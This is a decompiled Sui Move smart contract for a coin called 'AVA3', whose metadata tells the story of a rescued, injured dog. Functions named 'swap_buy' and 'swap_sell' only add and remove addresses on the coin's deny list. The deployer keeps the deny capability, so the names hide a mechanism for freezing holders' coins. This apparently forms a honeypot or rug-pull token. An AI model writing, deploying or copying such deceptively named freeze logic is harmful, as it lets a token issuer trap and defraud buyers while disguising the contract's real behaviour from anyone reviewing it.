module 0xc5b5b2f12a0fa34ec31008b00fec3ff393e6f86c125cd6ff65475beabe4bb02d::ava3 {
    struct AVA3 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: AVA3, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<AVA3>(arg0, 9, b"AVA3", b"THE RESCUED POOCH", b"Upon arrival, they found Ava malnourished and missing her right rear leg, which appeared recently amputated. She also had an injured left eye, severe emaciation, and other fractures that had healed abnormally.", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZLsLWNfrkqTi9SSE1F2P5E3LByo1PdzuNCt6QAuahuXK"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<AVA3>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<AVA3>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<AVA3>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<AVA3>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AVA3>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<AVA3>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<AVA3>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<AVA3>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

